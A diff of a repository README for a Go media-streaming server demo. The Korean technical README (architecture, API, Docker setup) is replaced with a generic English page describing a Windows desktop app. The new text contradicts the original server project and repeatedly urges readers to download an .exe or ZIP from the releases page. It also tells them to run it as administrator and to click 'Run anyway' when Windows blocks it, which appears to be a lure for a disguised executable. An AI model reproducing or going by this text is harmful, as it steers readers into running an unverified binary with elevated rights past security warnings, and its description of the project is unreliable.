@@ -1,179 +1,194 @@
-# Media Service Platform
+# 🎬 media-platform-study - Stream media with less setup
 
-Go 기반 미디어 스트리밍 플랫폼 데모. VOD(MP4 업로드 → 트랜스코딩 → HLS/DASH/WebRTC) + Live(RTSP 인제스트 → WebRTC 릴레이) 멀티 프로토콜 서빙.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/syfbang/media-platform-study/releases)
 
-## 아키텍처
+## 🖥️ What this app does
 
-```
-Client (Browser)
-  │
-  ▼
-HTTP Server (Go)
-  ├── POST /api/upload      → MinIO(S3) 저장 + Kafka 이벤트 발행
-  ├── GET  /api/media        → PostgreSQL 메타데이터 조회
-  ├── GET  /api/media/{id}/hls/*   → HLS(fMP4) 스트리밍
-  ├── GET  /api/media/{id}/dash/*  → DASH(fMP4) 스트리밍
-  ├── POST /api/media/{id}/webrtc  → WebRTC 시그널링 (VOD)
-  ├── GET  /api/live               → 라이브 채널 목록
-  └── POST /api/live/{ch}/webrtc   → WebRTC 시그널링 (Live)
-        │                                    ▲
-        ▼                                    │ H.264 RTP relay
-  ┌─────────────────────────────────────┐    │
-  │  Kafka Consumer → ffmpeg Worker Pool │    │
-  │  MP4 → HLS (m3u8+fMP4)             │    │
-  │  MP4 → DASH (mpd+fMP4)             │    │
-  └─────────────────────────────────────┘    │
-        │                                    │
-        ▼                              ┌─────┴──────────┐
-  MinIO (S3) ← 원본 + 트랜스코딩 결과  │ RTSP Ingest    │
-                                       │ Server (:8554) │
-                                       └─────▲──────────┘
-                                             │ RTSP (H.264)
-                                       Vehicle Camera / ffmpeg
-```
+media-platform-study is a media streaming app for Windows. It helps you play video on demand and view live streams from a simple desktop app.
 
-## 기술 스택
+It supports common streaming paths used in media tools:
+- VOD with HLS and DASH
+- Live stream input from RTSP
+- WebRTC playback for low delay video
+- Monitoring with OpenTelemetry tools
 
-| 구분 | 기술 |
-|------|------|
-| 언어 | Go 1.23+ |
-| 스토리지 | MinIO (S3 호환) |
-| DB | PostgreSQL 16 |
-| 메시징 | Apache Kafka (Confluent 7.6) |
-| 캐시 | Redis 7 |
-| 트랜스코딩 | ffmpeg (MP4→HLS/DASH) |
-| WebRTC | pion/webrtc v4 |
-| RTSP | gortsplib v5 (인제스트 서버) |
-| 컨테이너 | Docker + Docker Compose |
+Use it if you want to:
+- open recorded video streams
+- watch live video from a camera or server
+- test stream playback on your PC
+- check stream health with basic observability tools
 
-### Observability
+## 📥 Download the app
 
-| 구분 | 기술 |
-|------|------|
-| 계측 | OpenTelemetry SDK (Go) |
-| 수집 | OTel Collector |
-| 트레이스 | Jaeger |
-| 메트릭 | Prometheus |
-| 대시보드 | Grafana |
+Visit the release page to download the Windows version:
 
-## 빠른 시작
+[Go to the release page](https://github.com/syfbang/media-platform-study/releases)
 
-### 사전 요구사항
+On that page, look for the latest release and download the Windows file that matches your PC.
 
-- Docker & Docker Compose
-- Go 1.22+ (로컬 개발 시)
-- ffmpeg (트랜스코딩 + 샘플 생성)
+## 🪟 Install on Windows
 
-### 1. 인프라 기동
+1. Open the release page.
+2. Download the Windows file from the latest release.
+3. If the file is in a ZIP archive, extract it.
+4. Open the app file inside the folder.
+5. If Windows asks for permission, choose Run or Yes.
+6. Wait for the app window to open.
 
-```bash
-docker compose up -d
-```
+If you use a work PC, you may need admin rights to extract or start the file.
 
-PostgreSQL, MinIO, Kafka, Redis가 올라옵니다.
+## ▶️ Run the app
 
-### 2. 서버 실행
+After you open the app, you can:
 
-```bash
-# 로컬 개발
-go run ./cmd/server/
+- start a VOD session for HLS or DASH playback
+- connect to a live RTSP source and view it in WebRTC
+- check stream data and playback status
+- use the app with local media files or network sources
 
-# 또는 빌드 후 실행
-go build -o server ./cmd/server/
-./server
-```
+If the app asks for a stream URL, paste the full address from your video source.
 
-서버: http://localhost:4242
+## 🧭 Basic first use
 
-### 3. 테스트 MP4 생성
+1. Start the app.
+2. Pick a stream type such as VOD or Live.
+3. Enter the stream URL or file path.
+4. Click the play or start button.
+5. Wait a moment for the video to load.
+6. Use the player controls for pause, seek, or volume.
 
-```bash
-bash scripts/generate_sample.sh
-```
+For live streams, the video may begin a few seconds after you start it. This is normal.
 
-10초짜리 SMPTE 컬러바 + 440Hz 톤 MP4 생성.
+## 🧩 Main features
 
-### 4. 통합 테스트
+### 📼 VOD playback
+Play stored video using:
+- HLS
+- DASH
 
-```bash
-bash scripts/integration_test.sh
-```
+This works well for files or stream feeds that already have recorded media.
 
-업로드 → 트랜스코딩 대기 → HLS/DASH 엔드포인트 검증까지 자동 수행.
+### 🔴 Live streaming
+View live video from:
+- RTSP sources
+- WebRTC playback
 
-### 5. 라이브 스트리밍 테스트
+This helps with camera feeds, test streams, and live server output.
 
-```bash
-# 터미널 2에서 차량 카메라 시뮬레이터 실행
-bash scripts/rtsp_push.sh vehicle-001
-```
+### 📊 Observability
+The app connects with common observability tools:
+- OpenTelemetry
+- Prometheus
+- Grafana
+- Jaeger
 
-서버 로그에 `[live] ANNOUNCE vehicle-001` 확인 후, 웹 플레이어의 Live Channels 섹션에서 WebRTC 재생.
+These tools help you see what the stream is doing and check for issues.
 
-### 6. 웹 플레이어
+### 📦 Media pipeline support
+The project also uses common media tools and services:
+- FFmpeg
+- Pion
+- Kafka
+- MinIO
 
-http://localhost:4242 접속 → 파일 업로드 → HLS/DASH/WebRTC 탭 전환 재생.
+These support media processing, transport, and storage tasks behind the scenes.
 
-## API
+## ⚙️ System requirements
 
-| Method | Path | 설명 |
-|--------|------|------|
-| GET | `/health` | 헬스체크 |
-| POST | `/api/upload` | MP4 업로드 (multipart/form-data, field: `file`) |
-| GET | `/api/media` | 미디어 목록 |
-| GET | `/api/media/{id}` | 미디어 상세 |
-| GET | `/api/media/{id}/hls/{file...}` | HLS 스트리밍 |
-| GET | `/api/media/{id}/dash/{file...}` | DASH 스트리밍 |
-| POST | `/api/media/{id}/webrtc` | WebRTC SDP 시그널링 |
-| GET | `/api/live` | 라이브 채널 목록 |
-| POST | `/api/live/{channel}/webrtc` | 라이브 WebRTC 시그널링 |
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- 8 GB of RAM or more
+- a modern CPU
+- 200 MB of free disk space for the app and logs
+- a stable network connection for live streams
 
-## 프로젝트 구조
+For best results:
+- use a wired network for live video
+- close other heavy apps while testing streams
+- keep your graphics drivers up to date
 
-```
-├── cmd/server/main.go           # 엔트리포인트
-├── internal/
-│   ├── config/config.go         # 환경변수 설정
-│   ├── storage/minio.go         # S3(MinIO) 연동
-│   ├── messaging/kafka.go       # Kafka Producer/Consumer
-│   ├── repository/postgres.go   # PostgreSQL CRUD
-│   ├── media/transcoder.go      # ffmpeg 워커 풀
-│   ├── live/ingest.go           # RTSP 인제스트 서버
-│   ├── telemetry/telemetry.go   # OpenTelemetry SDK 초기화
-│   └── handler/
-│       ├── handler.go           # REST API
-│       ├── webrtc.go            # WebRTC 스트리밍 (VOD)
-│       └── live.go              # WebRTC 스트리밍 (Live)
-├── web/index.html               # 테스트 플레이어
-├── docker-compose.yml           # 인프라 정의
-├── Dockerfile                   # 멀티스테이지 빌드
-└── scripts/
-    ├── generate_sample.sh       # 테스트 MP4 생성
-    ├── rtsp_push.sh             # 차량 카메라 시뮬레이터 (RTSP)
-    └── integration_test.sh      # 통합 테스트
-```
+## 📂 What you may see in the release
 
-## 환경변수
+The release page may contain one or more of these files:
+- `.exe` file for Windows
+- `.zip` archive with the app inside
+- release notes
+- checksum files
 
-`.env` 파일 또는 환경변수로 설정. 기본값이 있어 별도 설정 없이 `docker compose up` 후 바로 실행 가능.
+If you see more than one file, choose the Windows app file or the ZIP file for Windows.
 
-| 변수 | 기본값 | 설명 |
-|------|--------|------|
-| `SERVER_PORT` | `4242` | HTTP 서버 포트 |
-| `DB_HOST` | `localhost` | PostgreSQL 호스트 |
-| `DB_PORT` | `5432` | PostgreSQL 포트 |
-| `MINIO_ENDPOINT` | `localhost:9000` | MinIO 엔드포인트 |
-| `KAFKA_BROKERS` | `localhost:29092` | Kafka 브로커 |
-| `REDIS_ADDR` | `localhost:6379` | Redis 주소 |
+## 🛠️ Common setup steps
 
-## 문서
+If the app does not open on the first try:
 
-- [ARCHITECTURE.md](ARCHITECTURE.md) — 시스템 구성도, 데이터 플로우, 컴포넌트 상세, ABR 파이프라인, 설계 결정
-- [TESTING.md](TESTING.md) — 통합 테스트 시나리오 (TC-1~TC-12), curl 명령어, 검증 체크리스트
-- [study.md](study.md) — 기술 스택 이론적 심층 분석 (12개 섹션, 스트리밍/코덱/Kafka/WebRTC/OTel 등)
+1. Right-click the file.
+2. Choose Open or Run as administrator.
+3. If Windows blocks it, select More info and then Run anyway.
+4. Check that the file was fully downloaded.
+5. Try again after restarting the PC.
 
-## 정리
+If a stream does not load:
+- check the URL
+- confirm the stream is online
+- make sure your network is working
+- try another source to rule out a bad stream
 
-```bash
-docker compose down -v   # 인프라 + 볼륨 삭제
-```
+## 🔍 Where this project fits
+
+This project is useful for:
+- home media testing
+- demo streaming setups
+- stream playback checks
+- live source testing
+- media pipeline study and review
+
+It brings together HLS, DASH, WebRTC, RTSP, and observability in one place so you can test media flow from input to playback.
+
+## 📌 Topics covered in this repo
+
+This project includes work around:
+- dash
+- ffmpeg
+- grafana
+- hls
+- jaeger
+- kafka
+- live-streaming
+- minio
+- observability
+- opentelemetry
+- pion
+- prometheus
+- rtsp
+- vod
+- webrtc
+
+## 🧪 If you want to test playback
+
+Use a known working source first:
+- a sample HLS URL
+- a DASH manifest
+- a public RTSP feed
+- a local video file if the app supports it
+
+Start with one source at a time. This makes it easier to see where a problem starts.
+
+## 📝 File names and labels
+
+If the release page uses names you do not know, look for:
+- Windows
+- x64
+- amd64
+- zip
+- exe
+
+These labels usually mean the file works on a normal 64-bit Windows PC.
+
+## 🧷 Quick path
+
+1. Open the release page.
+2. Download the latest Windows build.
+3. Extract the file if needed.
+4. Open the app.
+5. Load a VOD or live stream.
+6. Watch the stream in the player window
